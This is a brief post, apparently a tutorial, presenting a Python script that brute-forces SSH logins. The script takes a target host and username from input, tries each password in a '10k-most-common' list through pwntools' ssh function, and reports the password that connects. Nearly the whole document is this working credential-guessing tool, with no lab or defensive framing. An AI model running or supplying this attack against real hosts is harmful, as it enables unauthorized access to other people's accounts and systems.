This is a stupid simple bruteforce attack.

We're going through a password list and making shh connections untill

__a)__ run out of passwords __b)__ get a successfull match.

```python
from pwn import *
import paramiko

host = input("Enter the host address: ")
username = input("Enter the username: ")

attempts = 0

with open("10k-most-common.txt", 'r') as password_list:
    for password in password_list:
        password = password.strip('\n')
        try:
            print("Attempt:{} | {}".format(attempts, password))
            response = ssh(host=host,user=username,password=password, timeout=1)
            if response.connected():
                print("Password found{}".format(password))
                response.close()
                break
            response.close()
        except Exception as e:
            print("Error:", e)
        attempts += 1
print('Finished running through password file')
```
